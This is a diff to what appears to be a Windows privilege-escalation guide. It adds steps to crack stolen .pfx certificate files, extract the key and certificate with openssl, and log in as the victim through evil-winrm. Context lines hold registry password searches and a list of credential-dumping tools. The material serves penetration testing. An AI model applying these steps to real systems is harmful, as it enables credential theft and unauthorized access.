@@ -1344,6 +1344,22 @@ REG QUERY HKLM /F "password" /t REG_SZ /S /d
 REG QUERY HKCU /F "password" /t REG_SZ /S /d
 ```
 
+### Personal Information Exchange (.pfx) Files <a href="#personal-information-exchange-pfx-files" id="personal-information-exchange-pfx-files"></a>
+
+When an organization deploys corporate services that require **two-way SSL/TLS authentication** for users. A user is issued a **password-protected Personal Information Exchange** file (PKCS12 format, **.p12 or .pfx**) containing an **SSL/TLS client certificate and a private key**.
+
+If you find one of these files, you will [need to **crack it first**](../../brute-force.md#pfx-certificates). Then, with the **password**, you can **extract the certificate and private key** lo login as the **user the certificate was released to.**\
+****Finally, having the **password and getting the username from the pfx file**, you can try to login in the system with that user.
+
+```bash
+# Get the private key (you need the password)
+openssl pkcs12 -nocerts -in file.pfx -out cert.key
+# Get the cert (you need the password)
+openssl pkcs12 -in file.pfx -clcerts -nokeys -out cert.crt
+# Connect via evil-winrm
+evil-winrm --ssl -P 5986 -c cert.crt -k cert.key -u "<username>" -p "<pfx_password>" -i <ip>
+```
+
 ### Tools that search for passwords
 
 [**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin I have created this plugin to **automatically execute every metasploit POST module that searches for credentials** inside the victim.\
@@ -1434,8 +1450,8 @@ If you manages to **hijack a dll** being **loaded** by a **process** running as 
 #### PS
 
 [**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
-[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](broken-reference/)**). Detected.**\
-[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](broken-reference/)**).**\
+[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Check for misconfigurations and sensitive files (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
+[**JAWS**](https://github.com/411Hall/JAWS) **-- Check for some possible misconfigurations and gather info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
 [**privesc** ](https://github.com/enjoiz/Privesc)**-- Check for misconfigurations**\
 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information. Use -Thorough in local.**\
 [**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Extracts crendentials from Credential Manager. Detected.**\
